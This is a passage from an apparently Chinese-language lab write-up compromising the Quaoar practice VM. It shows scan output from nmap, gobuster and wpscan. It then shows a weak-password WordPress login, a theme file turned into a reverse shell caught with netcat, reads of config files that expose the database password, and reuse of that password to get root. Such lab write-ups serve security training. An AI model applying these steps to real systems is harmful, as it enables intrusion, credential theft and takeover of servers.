class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br></code></pre></td></tr></table></figure><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.145 -w /usr/share/seclists/Discovery/Web-Content/big.txt<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.145<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/24 03:56:43 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.htaccess            (Status: 403) [Size: 291]<br>/.htpasswd            (Status: 403) [Size: 291]<br>/LICENSE              (Status: 200) [Size: 1672]<br>/cgi-bin/             (Status: 403) [Size: 290]<br>/hacking              (Status: 200) [Size: 616848]<br>/index                (Status: 200) [Size: 100]<br>/robots               (Status: 200) [Size: 271]<br>/robots.txt           (Status: 200) [Size: 271]<br>/server-status        (Status: 403) [Size: 295]<br>/upload               (Status: 301) [Size: 317] [--&gt; http://192.168.56.145/upload/]<br>/wordpress            (Status: 301) [Size: 320] [--&gt; http://192.168.56.145/wordpress/]<br>Progress: 20051 / 20477 (97.92%)<br>===============================================================<br>2023/09/24 03:56:47 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>wpscan 一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ wpscan --url http://192.168.56.145/wordpress/ -e u,ap<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | |_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://192.168.56.145/wordpress/ [192.168.56.145]<br>[+] Started: Sun Sep 24 03:57:20 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.2.22 (Ubuntu)<br> |  - X-Powered-By: PHP/5.3.10-1ubuntu3<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.145/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.145/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.145/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.145/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.145/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br> |  - http://192.168.56.145/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyfourteen<br> | Location: http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.6<br> | Style URL: http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14<br> | Style Name: Twenty Fourteen<br> | Style URI: http://wordpress.org/themes/twentyfourteen<br> | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...<br> | Author: the WordPress team<br> | Author URI: http://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.1 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.145/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14, Match: <span class="hljs-string">&#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] mail-masta<br> | Location: http://192.168.56.145/wordpress/wp-content/plugins/mail-masta/<br> | Latest Version: 1.0 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2014-09-19T07:52:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.0 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://192.168.56.145/wordpress/wp-content/plugins/mail-masta/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:01 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:01<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Posts - Display Name (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] wpuser<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Sep 24 03:57:25 2023<br>[+] Requests Done: 28<br>[+] Cached Requests: 39<br>[+] Data Sent: 7.855 KB<br>[+] Data Received: 47.094 KB<br>[+] Memory used: 252.723 MB<br>[+] Elapsed time: 00:00:05<br></code></pre></td></tr></table></figure><p>mail-masta 插件、<code>wpuser, admin</code> 用户名</p><h2 id="Wordpress-渗透"><a href="#Wordpress-渗透" class="headerlink" title="Wordpress 渗透"></a>Wordpress 渗透</h2><p>尝试爆破，先试试 admin:admin 弱密码</p><p><img src="/pic/653421b2b6905dd550b0bb2089b8d15c_MD5.png"></p><p>竟然一下子进去了，省的爆破了</p><p><img src="/pic/41d51433d203b513390826e1c5d81db9_MD5.png"></p><p>修改 404.php 为反弹 shell 的代码，提前开启监听，访问 <code>192.168.56.145/wordpress/wp-content/themes/twentyfourteen/404.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nc -lvnp 443                                                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.145] 51895<br>Linux Quaoar 3.2.0-23-generic-pae <span class="hljs-comment">#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 athlon i386 GNU/Linux</span><br> 12:06:52 up 1 day,  1:26,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.04, 0.08<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 athlon i386 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:a6:ae:f1 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.145/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fea6:aef1/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN </span><br><span class="hljs-string">    link/ether e2:90:ba:43:68:7b brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@Quaoar:/</span><br></code></pre></td></tr></table></figure><p>查看网站根目录，寻找数据库密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var$ <span class="hljs-built_in">cd</span> www<br><span class="hljs-built_in">cd</span> www<br>www-data@Quaoar:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CHANGELOG                       hack-planet-high-definition-mobile.jpg<br>COPYING                         hacker-manifesto-ethical.jpg<br>Hack_The_Planet.jpg             hacking.jpg<br>Hack_The_Planet2.jpg            hsperfdata_tomcat6<br>Hack_The_Planet3.jpg            index.html<br>INSTALL                         pososibo-ethical-hacking-hack-fond.jpg<br>LICENSE                         robots.txt<br>Quaoar.jpg                      tomcat6-tomcat6-tmp<br>README.md                       upload<br>hack-planet-1280-amox-zone.jpg  wordpress<br>www-data@Quaoar:/var/www$ <span class="hljs-built_in">cd</span> upload<br><span class="hljs-built_in">cd</span> upload<br>www-data@Quaoar:/var/www/upload$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>account  config.php  include    languages  modules  search  templates<br>admins   framework   index.php  media      page     temp<br>www-data@Quaoar:/var/www/upload$ <span class="hljs-built_in">cat</span> config.php<br><span class="hljs-built_in">cat</span> config.php<br>&lt;?php<br><br><span class="hljs-keyword">if</span>(defined(<span class="hljs-string">&#x27;LEPTON_PATH&#x27;</span>)) &#123; die(<span class="hljs-string">&#x27;By security reasons it is not permitted to load \&#x27;</span>config.php\<span class="hljs-string">&#x27; twice!! Forbidden call from \&#x27;</span><span class="hljs-string">&#x27;.$_SERVER[&#x27;</span>SCRIPT_NAME<span class="hljs-string">&#x27;].&#x27;</span>\<span class="hljs-string">&#x27;!&#x27;</span>); &#125;<br><br>// config file created by LEPTON 2.2.0<br>define(<span class="hljs-string">&#x27;DB_TYPE&#x27;</span>, <span class="hljs-string">&#x27;mysql&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PORT&#x27;</span>, <span class="hljs-string">&#x27;3306&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;rootpassword!&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;Lepton&#x27;</span>);<br>define(<span class="hljs-string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="hljs-string">&#x27;lep_&#x27;</span>);<br></code></pre></td></tr></table></figure><p>wordpress 目录也看看是不是一样的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var/www$ <span class="hljs-built_in">cd</span> wordpress<br><span class="hljs-built_in">cd</span> wordpress<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configurations of the WordPress.<br> *<br> * This file has the following configurations: MySQL settings, Table Prefix,<br> * Secret Keys, WordPress Language, and ABSPATH. You can find more information<br> * by visiting &#123;@<span class="hljs-built_in">link</span> http://codex.wordpress.org/Editing_wp-config.php Editing<br> * wp-config.php&#125; Codex page. You can get the MySQL settings from your web host.<br> *<br> * This file is used by the wp-config.php creation script during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can just copy this file</span><br><span class="hljs-string"> * to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpress<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>rootpassword!<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define(&#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define(&#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don、&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define(<span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>/** */<br>define(<span class="hljs-string">&#x27;WP_HOME&#x27;</span>,<span class="hljs-string">&#x27;/wordpress/&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WP_SITEURL&#x27;</span>,<span class="hljs-string">&#x27;/wordpress/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看一看有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">ls</span> -liah /home<br><span class="hljs-built_in">ls</span> -liah /home<br>total 12K<br>    22 drwxr-xr-x  3 root root 4.0K Oct 24  2016 .<br>     2 drwxr-xr-x 22 root root 4.0K Oct  7  2016 ..<br>406408 drwxr-xr-x  2 root root 4.0K Oct 22  2016 wpadmin<br>www-data@Quaoar:/var/www/wordpress$ <span class="hljs-built_in">cd</span> /home/wpadmin<br><span class="hljs-built_in">cd</span> /home/wpadmin<br>www-data@Quaoar:/home/wpadmin$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 12K<br>406408 drwxr-xr-x 2 root    root    4.0K Oct 22  2016 .<br>    22 drwxr-xr-x 3 root    root    4.0K Oct 24  2016 ..<br>406409 -rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt<br>www-data@Quaoar:/home/wpadmin$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>2bafe61f03117ac66a73c3c514de796e<br></code></pre></td></tr></table></figure><h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>尝试用数据库密码切换一下登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Quaoar:/home/wpadmin$ su<br>su<br>Password: rootpassword!<br><br>root@Quaoar:/home/wpadmin<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@Quaoar:~<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 48K<br>    25 drwx------  6 root root 4.0K Nov 30  2016 .<br>     2 drwxr-xr-x 22 root root 4.0K Oct  7  2016 ..<br>  6833 drwx------  2 root root 4.0K Oct  7  2016 .aptitude<br> 11946 -rw-------  1 root root  368 Jan 15  2017 .bash_history<br>   500 -rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc<br> 11964 drwx------  2 root root 4.0K Oct 15  2016 .cache<br> 11962 ----------  1 root root   33 Oct 22  2016 flag.txt<br>   499 -rw-r--r--  1 root root  140 Apr 19  